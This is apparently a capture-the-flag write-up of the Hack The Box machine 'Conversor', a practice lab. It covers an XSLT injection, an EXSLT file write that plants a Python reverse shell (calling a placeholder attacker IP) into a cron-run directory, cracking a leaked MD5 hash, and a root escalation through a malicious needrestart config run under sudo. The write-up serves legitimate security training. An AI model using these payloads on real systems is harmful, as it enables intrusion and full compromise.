---
date: 2026-03-20T06:13:51-05:00
# description: ""
image: "/images/HTB-Conversor/Conversor.png"
showTableOfContents: true
tags: ["Hackthebox", "xslt-injection", "cronjob-abuse", "arbitrary-file-write", "needrestart", "exslt", "linux-privesc", "source-code-review"]
categories: ["Writeups"]
title: "HTB: Conversor"
type: "post"
---

* Platform: Hack The Box
* Link: [Conversor](https://app.hackthebox.com/machines/Conversor)
* Level: Easy
* OS: Linux
---

Conversor begins with the discovery of an XML conversion service vulnerable to arbitrary XSLT stylesheet execution. By abusing EXSLT extension elements, we achieve arbitrary file write within the web application directory. A scheduled cron job executing Python scripts from this writable location allows us to obtain remote code execution and an initial foothold as `www-data`. Further enumeration reveals a database file containing credentials for another system user, enabling lateral movement. Finally, root privileges are obtained by exploiting elevated execution rights on the `needrestart` utility.

# Scanning

```
nmap -sC -sV -oA nmap/Conversor {TARGET_IP}
```

**Results**
```shell
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-19 19:49 EDT
Nmap scan report for 10.129.238.31 (10.129.238.31)
Host is up (0.33s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 01:74:26:39:47:bc:6a:e2:cb:12:8b:71:84:9c:f8:5a (ECDSA)
|_  256 3a:16:90:dc:74:d8:e3:c4:51:36:e2:08:06:26:17:ee (ED25519)

80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://conversor.htb/
Service Info: Host: conversor.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.75 seconds
```

The nmap scan discovers two open ports: 22 with `SSH` and 80 with `http`. There is also a redirection to `conversor.htb`.

```
sudo echo "{IP} conversor.htb" | sudo tee -a /etc/hosts
```

# Enumeration

Visiting `http://conversor.htb` leads to a login page.

![Conversor website](/images/HTB-Conversor/conversor_website.png)

After registering and logging in we find an application to convert XML files.

![Conversor tool](/images/HTB-Conversor/conversor_convertor.png)

> An `XSLT` file is used to transform XML data into another format such as HTML, plain text, or another XML structure. 

The application accepts two files (`XML` and `XSLT`) and produces an HTML file.

We test the feature with some simple files.

`nmap.xml`
```xml
<host>
  <ip>10.10.10.5</ip>
  <port>22</port>
</host>
```

`nmap.xslt`
```XML
<?xml version="1.0"?>

<xsl:stylesheet version="1.0"
 xmlns:xsl="http://www.w3.org/1999/XSL/Transform">

<xsl:template match="/">
  <html>
    <body>
      <xsl:apply-templates/>
    </body>
  </html>
</xsl:template>

<xsl:template match="host">
  <p>Host IP: <xsl:value-of select="ip"/></p>
  <p>Open Port: <xsl:value-of select="port"/></p>
</xsl:template>

</xsl:stylesheet>
```

![Conversor HTML file](/images/HTB-Conversor/conversor_HTML_file.png)

![Conversor HTML file display](/images/HTB-Conversor/HTML_file_display.png)

Since we are dealing with XSLT files we test for an injection vulnerability. On [this page](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSLT%20Injection) we can grab some XSLT injection payloads. 

XSLT file used
```XML
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body>
<br />Version: <xsl:value-of select="system-property('xsl:version')" />
<br />Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
<br />Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
</body>
</html>
```

Our payload returns the vendor information confirming the XSLT injection vulnerability.

![XSLT injection](/images/HTB-Conversor/XSLT_injection.png)

We continue our enumeration with directory brute forcing and find `/about`.

```
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://conversor.htb
```

![directory brute forcing](/images/HTB-Conversor/conversor_gobuster.png)

At `http://conversor.htb/about` we can download the application source code!

![Conversor source code](/images/HTB-Conversor/conversor_src_code.png)

It's a Python application. Although we have confirmed the vulnerability we cannot get RCE yet because Python apps don't process XSLT themselves, they rely on different libraries. In our case it is `libxslt`.

With `libxslt` we usually have:
* XSLT execution
* EXSLT support (file write possible)
* `document()` (file read / SSRF)

This means that direct RCE during the transformation process is probably not possible. However since we most likely have EXSLT support we can try to achieve RCE via file write, which requires a writable directory on the target.

We find a `users.db` file in the `instance` directory, ours is empty since we haven't installed the solution on our system.

![Conversor database file](/images/HTB-Conversor/conversor_db.png)

Reading `install.md` we learn that there is a cron job executing python scripts in `/var/www/conversor.htb/scripts/` every minute. 

![Conversor cronjob](/images/HTB-Conversor/conversor_cron.png)

# Initial Foothold

We modify our payload to target the vulnerable directory and submit the new `XSLT` file.

```XML
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                xmlns:exsl="http://exslt.org/common"
                extension-element-prefixes="exsl"
                version="1.0">

  <xsl:template match="/">
    <exsl:document href="/var/www/conversor.htb/scripts/shell.py" method="text">
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("YOUR_IP",PORT_NUMBER))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
import pty
pty.spawn("/bin/sh")
    </exsl:document>
  </xsl:template>

</xsl:stylesheet>
```

On the listener we get a shell as `www-data`.

![Conversor foothold](/images/HTB-Conversor/conversor_foothold.png)

We upgrade the shell with the commands below.
```
python3 -c 'import pty;pty.spawn("/bin/bash")'  
export TERM=xterm
ctrl + z  
stty raw -echo; fg
stty rows 38 columns 116
```

## Shell as fismathack

In `/var/www/conversor.htb/instance` we find `users.db`. Inside the database file we find the password hash for user `fismathack`.

![Conversor hash](/images/HTB-Conversor/conversor_hash.png)

```
5b5c3ac3a1c897c94caad48e6c71fdec
```

```
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

We retrieve the password `Keepmesafeandwarm`.

![fismathack password](/images/HTB-Conversor/fismathack.png)

We switch to the user `fismathack` and read the user flag.

![Conversor user flag](/images/HTB-Conversor/conversor_user.png)

# Privilege Escalation

We run `sudo -l` to check the sudo privileges.

![sudo privileges](/images/HTB-Conversor/conversor_sudo_privs.png)

The user `fismathack` is able to run `/usr/sbin/needrestart` as `sudo` without providing a password.

Consulting the man pages (`man needrestart`) we learn that `needrestart` accepts configuration files with the `-c` option. 

![needrestart man pages](/images/HTB-Conversor/man_needrestart.png)

We create a malicious configuration file `root.conf` to spawn a root shell.
```
system("/bin/bash");
```

```
sudo /usr/sbin/needrestart -c /tmp/root.conf
```

![root shell](/images/HTB-Conversor/conversor_root.png)

